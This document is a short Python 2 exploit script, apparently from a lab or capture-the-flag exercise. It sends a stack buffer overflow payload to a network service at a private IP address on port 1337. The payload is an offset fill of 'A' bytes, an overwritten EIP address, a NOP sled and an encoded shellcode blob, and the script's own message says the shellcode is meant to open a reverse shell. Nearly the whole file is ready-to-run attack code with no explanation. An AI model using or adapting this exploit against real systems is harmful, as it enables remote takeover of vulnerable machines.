#!/usr/bin/python
import socket
import traceback

targetIP = "192.168.1.1"
targetPort = 1337
eipOffset = 1000
nopsledSize = 12

try:
  print "\nGet your reverse shell ready..."
  
  preFill = "A" * eipOffset
  eip = "\xcf\x10\x80\x14"
  padding = "-" * 8
  nopsled = "\x90" * nopsledSize
  shellcode = ("\xd9\xea\xd9\x74\x24\xf4\x5d\x33\xc9\xbb\xee\xd9\x16\x70\xb1"
    "\x52\x31\x5d\x17\x83\xc5\x04\x03\xb3\xca\xf4\x85\xb7\x05\x7a"
    "\x65\x47\xd6\x1b\xef\xa2\xe7\x1b\x8b\xa7\x58\xac\xdf\xe5\x54"
    "\x47\x8d\x1d\xee\x25\x1a\x12\x47\x83\x7c\x1d\x58\xb8\xbd\x3c"
    "\xda\xc3\x91\x9e\xe3\x0b\xe4\xdf\x24\x71\x05\x8d\xfd\xfd\xb8"
    "\x21\x89\x48\x01\xca\xc1\x5d\x01\x2f\x91\x5c\x20\xfe\xa9\x06"
    "\xe2\x01\x7d\x33\xab\x19\x62\x7e\x65\x92\x50\xf4\x74\x72\xa9"
    "\xf5\xdb\xbb\x05\x04\x25\xfc\xa2\xf7\x50\xf4\xd0\x8a\x62\xc3"
    "\xab\x50\xe6\xd7\x0c\x12\x50\x33\xac\xf7\x07\xb0\xa2\xbc\x4c"
    "\x9e\xa6\x43\x80\x95\xd3\xc8\x27\x79\x52\x8a\x03\x5d\x3e\x48"
    "\x2d\xc4\x9a\x3f\x52\x16\x45\x9f\xf6\x5d\x68\xf4\x8a\x3c\xe5"
    "\x39\xa7\xbe\xf5\x55\xb0\xcd\xc7\xfa\x6a\x59\x64\x72\xb5\x9e"
    "\x8b\xa9\x01\x30\x72\x52\x72\x19\xb1\x06\x22\x31\x10\x27\xa9"
    "\xc1\x9d\xf2\x7e\x91\x31\xad\x3e\x41\xf2\x1d\xd7\x8b\xfd\x42"
    "\xc7\xb4\xd7\xea\x62\x4f\xb0\xd4\xdb\x38\x84\xbd\x19\xc6\x15"
    "\x65\x97\x20\x7f\x89\xf1\xfb\xe8\x30\x58\x77\x88\xbd\x76\xf2"
    "\x8a\x36\x75\x03\x44\xbf\xf0\x17\x31\x4f\x4f\x45\x94\x50\x65"
    "\xe1\x7a\xc2\xe2\xf1\xf5\xff\xbc\xa6\x52\x31\xb5\x22\x4f\x68"
    "\x6f\x50\x92\xec\x48\xd0\x49\xcd\x57\xd9\x1c\x69\x7c\xc9\xd8"
    "\x72\x38\xbd\xb4\x24\x96\x6b\x73\x9f\x58\xc5\x2d\x4c\x33\x81"
    "\xa8\xbe\x84\xd7\xb4\xea\x72\x37\x04\x43\xc3\x48\xa9\x03\xc3"
    "\x31\xd7\xb3\x2c\xe8\x53\xd3\xce\x38\xae\x7c\x57\xa9\x13\xe1"
    "\x68\x04\x57\x1c\xeb\xac\x28\xdb\xf3\xc5\x2d\xa7\xb3\x36\x5c"
    "\xb8\x51\x38\xf3\xb9\x73")

  data = preFill + eip + padding + nopsled + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIP, targetPort))
  s.send(data)
  s.close()

  print "\nDone!"
  
except Exception:
  traceback.print_exc()